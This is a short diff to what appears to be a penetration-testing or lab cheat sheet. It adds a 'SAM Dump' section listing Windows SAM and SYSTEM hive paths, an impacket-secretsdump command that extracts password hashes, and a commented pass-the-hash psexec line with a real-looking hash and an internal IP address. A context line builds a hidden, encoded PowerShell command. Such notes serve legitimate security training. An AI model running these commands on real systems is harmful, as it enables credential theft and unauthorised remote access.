@@ -121,3 +121,15 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 
 print(cmd)
 ```
+
+# SAM Dump
+
+- C:\windows.old\System32\SAM
+- C:\windows.old\System32\SYSTEM
+
+``` bash
+impacket-secretsdump -system SYSTEM -sam SAM LOCAL
+
+# impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.207.146
+```
+
